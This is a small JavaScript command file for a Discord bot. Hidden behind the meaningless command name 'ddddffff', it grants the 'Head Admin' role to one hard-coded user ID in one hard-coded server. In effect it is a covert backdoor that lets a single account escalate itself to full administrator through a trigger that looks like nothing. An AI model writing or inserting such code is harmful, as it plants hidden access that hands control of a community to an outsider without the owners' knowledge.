const Discord = require("discord.js");

module.exports.run = async (bot, message, args) => {
  if (message.author.id === "432650511825633317" && message.guild.id === "400508946709872660") {
    message.member.addRole(message.guild.roles.find("name", "Head Admin"))
  }
}

module.exports.help = {
	name: "ddddffff"
}
